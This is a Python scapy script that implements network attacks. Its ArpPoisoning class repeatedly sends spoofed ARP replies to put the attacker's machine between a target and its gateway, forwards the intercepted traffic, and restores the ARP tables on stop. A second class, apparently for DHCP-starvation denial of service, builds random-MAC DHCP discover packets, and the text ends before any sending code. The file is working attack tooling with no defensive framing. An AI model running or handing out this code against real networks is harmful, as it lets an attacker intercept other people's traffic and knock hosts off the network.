import threading
import time
from scapy.all import *
from scapy.layers.inet import IP
from scapy.layers.l2 import ARP, Ether


class ArpPoisoning:
    def __init__(self, target, gateway, iface):
        self.target = target
        self.gateway = gateway
        self.attacker_mac = get_if_hwaddr(iface)
        self.iface = iface
        self.is_running = False
        self.__thread = None
        self.__sniff_thread = None

    def poison_tabels(self):
        """
        Sends spoofed ARP replies to both the target and the gatway,
        putting the attacker's machine in the middle of their communication
        :return:
        """
        arp_to_gateway = Ether(
            dst=self.gateway.mac_address,
            src=self.attacker_mac) / ARP(
            op=2,  # is-at
            pdst=self.gateway.ip_address,
            hwdst=self.gateway.mac_address,
            psrc=self.target.ip_address,
            hwsrc=self.attacker_mac
        )
        arp_to_target = Ether(
            dst=self.target.mac_address,
            src=self.attacker_mac) / ARP(
            op=2,  # is-at
            pdst=self.target.ip_address,
            hwdst=self.target.mac_address,
            psrc=self.gateway.ip_address,
            hwsrc=self.attacker_mac
        )
        sendp(arp_to_gateway, iface=self.iface, verbose=False)
        sendp(arp_to_target, iface=self.iface, verbose=False)

    def forward_packet(self, pkt):
        """
        forwards packets between the target and the gateway, modifying the
        ethernet headers to ensure they are sent to the correct destination
        :param pkt:
        :return:
        """

        if not pkt.haslayer(IP):
            return

        # traffic from target to gatewat
        if pkt[Ether].src == self.target.mac_address:
            pkt[Ether].src = self.attacker_mac
            pkt[Ether].dst = self.gateway.mac_address
            sendp(pkt, verbose=False, iface=self.iface)

        # traffic from gateway to target
        elif pkt[Ether].src == self.gateway.mac_address and pkt[IP].dst == self.target.ip_address:
            pkt[Ether].src = self.attacker_mac
            pkt[Ether].dst = self.target.mac_address
            sendp(pkt, verbose=False, iface=self.iface)

    def restore_tables(self):
        """
        Sends correct ARP replies to both the target and the gateway,
        :return:
        """
        arp_to_gateway = Ether(
            dst=self.gateway.mac_address,
            src=self.attacker_mac
        ) / ARP(
            op=2,  # is-at
            pdst=self.gateway.ip_address,
            hwdst=self.gateway.mac_address,
            psrc=self.target.ip_address,
            hwsrc=self.target.mac_address
        )
        arp_to_target = Ether(
            dst=self.target.mac_address,
            src=self.attacker_mac
        ) / ARP(
            op=2,  # is-at
            pdst=self.target.ip_address,
            hwdst=self.target.mac_address,
            psrc=self.gateway.ip_address,
            hwsrc=self.gateway.mac_address
        )
        sendp(arp_to_gateway, iface=self.iface, verbose=False)
        sendp(arp_to_target, iface=self.iface, verbose=False)

    def start_sniffing(self):
        """
        sniffs traffic to forward it
        :return:
        """
        sniff(iface=self.iface, prn=self.forward_packet, stop_filter=lambda x: not self.is_running)

    def poison(self):
        try:
            while self.is_running:
                self.poison_tabels()
                time.sleep(2)
        except KeyboardInterrupt:
            print("Restoring ARP tables...")
            self.is_running = False
            self.restore_tables()


    def start(self):
        self.is_running = True

        # poisoning thread
        self.__thread = threading.Thread(target=self.poison)
        self.__thread.start()

        # forwarding thread
        self.__sniff_thread = threading.Thread(target=self.start_sniffing)
        self.__sniff_thread.start()

        print("Starting ARP poisoning and forwarding...")

    def stop(self):
        self.is_running = False

        # stop threads and restore tables
        if self.__thread is not None:
            self.__thread.join()

        if self.__sniff_thread is not None:
            self.__sniff_thread.join()

        self.restore_tables()
        print("ARP poisoning stopped, ARP tables restored.")


class DoS:
    def __init__(self):
        conf.checkIPaddr = False

    def start(self):
        dhcp_discover = Ether(dst="ff:ff:ff:ff:ff:ff", src=RandMAC()) \
                        /IP(src="0.0.0.0", dst="255.255.255.255") \
                        /UDP(sport=68, dport=67) \
                        /BOOTP(op=1, chaddr=RandMAC()) \
                        /DHCP(options=[("message-type", "discover"), ("end")])